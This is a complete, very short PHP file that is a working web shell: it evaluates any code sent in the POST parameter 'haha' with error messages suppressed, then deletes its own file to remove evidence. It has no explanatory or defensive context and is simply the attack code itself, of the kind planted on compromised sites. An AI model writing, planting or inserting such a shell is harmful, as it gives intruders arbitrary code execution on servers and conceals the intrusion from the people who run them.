<?php 
@eval($_POST['haha']);
unlink(__FILE__);
?>